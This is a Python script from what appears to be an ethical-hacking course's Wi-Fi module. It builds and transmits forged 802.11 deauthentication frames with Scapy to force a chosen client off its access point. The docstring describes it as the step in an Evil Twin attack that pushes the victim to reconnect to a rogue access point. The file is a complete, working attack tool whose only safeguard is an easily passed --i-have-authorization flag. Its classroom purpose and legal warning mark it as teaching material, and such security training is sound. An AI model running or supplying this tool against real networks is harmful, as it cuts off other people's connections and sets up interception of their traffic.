#!/usr/bin/env python3
"""
04_attacks/02_deauth_demo.py — Understand the mechanics of the deauthentication "kick".

⚠  THIS IS AN ACTIVE ATTACK TOOL. It transmits deauth frames.
   It forcibly disconnects a client from its access point.
   Use ONLY against a device YOU OWN, in a lab YOU CONTROL, with authorization.
   In Portugal: Lei 109/2009, Art. 7 — unauthorized interference → up to 3 years.

The minimal, slide-sized deauth demo. A deauthentication frame is a management
frame that says "you are no longer authenticated, goodbye." In open WPA2 it is
unauthenticated, so anyone can forge one on behalf of the AP. The client
believes its own network kicked it — and immediately tries to reconnect.

This is the last piece of the Evil Twin story: 2.2 told us which SSID the
client wants, 2.3 put that SSID on the air, and 2.4 is the shove that knocks
the client off the real AP so it reconnects — ideally to our twin. Run this in
a lab against your own test device and watch it drop and rejoin.

For the full deauth tool (broadcast mode, reason codes, counts), see 04_attacks/03_deauth.py.

Usage:
    sudo python3 04_attacks/02_deauth_demo.py --iface wlan1mon \\
        --client AA:BB:CC:DD:EE:FF --ap 11:22:33:44:55:66 \\
        --i-have-authorization

Requires: pip install scapy

CYBERS3C — Ethical Hacking Postgrad — Wi-Fi Module — Session 2
"""

import argparse
import sys

try:
    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
except ImportError:
    print("[!] Scapy missing. pip install scapy")
    sys.exit(1)

# --- make wifi_utils (repo root) importable from any topic subfolder ---
import os, sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from wifi_utils import require_root, require_monitor_mode, add_iface_arg, validate_mac


def main():
    parser = argparse.ArgumentParser(
        description="Send deauth frames to a single client to demo the 'kick'.",
    )
    add_iface_arg(parser)
    parser.add_argument("--client", required=True, metavar="AA:BB:CC:DD:EE:FF",
                        help="Target station — your own test device.")
    parser.add_argument("--ap", required=True, metavar="11:22:33:44:55:66",
                        help="BSSID of the legitimate AP the client is on.")
    parser.add_argument("--count", type=int, default=64, metavar="N",
                        help="Number of deauth frames to send. (default: 64)")
    parser.add_argument("--i-have-authorization", action="store_true",
                        help="Required. Confirms the target device is yours to test.")
    args = parser.parse_args()

    if not args.i_have_authorization:
        print("[!] This tool disconnects a client. Pass --i-have-authorization to")
        print("    confirm the target device is yours or authorized for testing.")
        sys.exit(1)

    try:
        client = validate_mac(args.client)
        ap = validate_mac(args.ap)
    except ValueError as e:
        print(f"[!] {e}")
        sys.exit(1)

    require_root("04_attacks/02_deauth_demo.py")
    require_monitor_mode(args.iface)

    # reason 7 = Class 3 frame received from nonassociated STA (most common)
    pkt = (RadioTap()
           / Dot11(addr1=client, addr2=ap, addr3=ap)
           / Dot11Deauth(reason=7))

    print(f"\n=== 2.4 Deauth demo | iface={args.iface} ===")
    print(f"[*] Kicking {client} off {ap} — {args.count} frames.")
    print("[*] Watch your test device drop and reconnect.\n")

    try:
        sendp(pkt, iface=args.iface, count=args.count, inter=0.1)
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
        sys.exit(0)

    print("[+] Done. The client should have re-run the 4-way handshake on reconnect.")


if __name__ == "__main__":
    main()
